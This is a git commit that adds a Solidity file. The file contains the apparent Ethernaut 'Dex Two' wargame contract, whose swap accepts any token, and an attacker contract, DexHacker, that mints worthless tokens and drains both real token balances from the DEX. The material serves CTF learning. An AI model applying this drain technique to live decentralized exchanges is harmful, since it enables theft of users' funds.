32be234419eed1007db09e675ec948596eb2c3cf
zisais <118950928+zisais@users.noreply.github.com>
2024-06-14 13:58:14 -0500

    Create DexTwo.sol

---
+++ contracts/DexTwo.sol
@@ -0,0 +1,86 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+address constant level = 0xeE5D7dF9CcE52ac16F4C4774fCc9E1c26E71A742;
+
+contract DexTwo is Ownable(level) {
+    address public token1;
+    address public token2;
+
+    constructor() {}
+
+    function setTokens(address _token1, address _token2) public onlyOwner {
+        token1 = _token1;
+        token2 = _token2;
+    }
+
+    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
+        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+    }
+
+    function swap(address from, address to, uint256 amount) public {
+        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+        uint256 swapAmount = getSwapAmount(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+
+    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
+        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+    }
+
+    function approve(address spender, uint256 amount) public {
+        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
+    }
+
+    function balanceOf(address token, address account) public view returns (uint256) {
+        return IERC20(token).balanceOf(account);
+    }
+}
+
+contract SwappableTokenTwo is ERC20 {
+    address private _dex;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
+
+
+contract DexHacker {
+    SwappableTokenTwo newToken1;
+    SwappableTokenTwo newToken2;
+    address instance;
+
+    constructor(address _instance) {
+        instance = _instance;
+    }
+
+    function start() external {
+        DexTwo dex = DexTwo(instance);
+        newToken1 = new SwappableTokenTwo(instance,'Token','TOKEN',200);
+        newToken2 = new SwappableTokenTwo(instance,'Token','TOKEN',200);
+
+        newToken1.transfer(instance,100);
+        newToken1.approve(address(this),instance,100);
+        newToken2.transfer(instance,100);
+        newToken2.approve(address(this),instance,100);
+
+        dex.swap(address(newToken1),dex.token1(),100);
+        dex.swap(address(newToken2),dex.token2(),100);
+    }
+}
